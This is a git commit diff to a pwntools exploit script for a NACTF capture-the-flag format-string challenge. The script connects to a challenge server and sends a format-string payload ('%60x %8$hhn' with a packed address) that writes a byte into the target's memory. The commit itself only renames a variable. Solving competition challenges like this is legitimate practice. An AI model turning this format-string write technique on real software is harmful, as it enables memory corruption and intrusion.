6cb0f5e7892c2feba30f436ecf8077d00d999445
Th3F0x-code <alessio.ciccola@gmail.com>
2020-11-13 09:56:39 +0100

    some changes

--- NACTF/Format_String/exp.py
+++ NACTF/Format_String/exp.py
@@ -1,7 +1,7 @@
 from pwn import *
 
 
-p = ELF('./format')
+elf = ELF('./format')
 p = remote('challenges.ctfd.io', 30266)
 p.recvuntil('.\n')
 p.sendline("%60x      %8$hhn{}".format(p64(0x404080)))
